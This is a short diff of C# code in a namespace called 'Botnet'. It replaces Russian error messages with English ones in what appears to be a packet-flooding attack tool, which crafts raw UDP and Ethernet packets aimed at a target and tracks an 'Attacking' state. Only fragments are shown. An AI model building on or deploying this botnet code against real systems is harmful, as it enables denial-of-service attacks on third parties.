@@ -72,7 +72,7 @@ namespace Botnet
                         if (TryConnectAm == 4)
                         {
                             Attacking = false;
-                            ErrorHandler(1, "Невозможно подключиться к цели");
+                            ErrorHandler(1, "Unable to connect to goal");
                         }
                         else
                         {
@@ -83,7 +83,7 @@ namespace Botnet
                     if (err.ErrorCode == (int)SocketError.AddressNotAvailable)
                     {
                         Attacking = false;
-                        ErrorHandler(0, "Указанный адрес недопустим");
+                        ErrorHandler(0, "The specified address is invalid");
                     }
                 } 
             }
@@ -104,7 +104,7 @@ namespace Botnet
                 ipPacket.PayloadPacket = udpPacket;
                 if (TargetMac == null)
                 {
-                    ErrorHandler(1, "Невозможно получить MAC адрес цели");
+                    ErrorHandler(1, "Can not get MAC target address");
                     return;
                 }; //unable to resolve mac 
                 EthernetPacket ethernetPacket = new EthernetPacket(Adapter.GetPhysicalAddress(), TargetMac, EthernetPacketType.None);
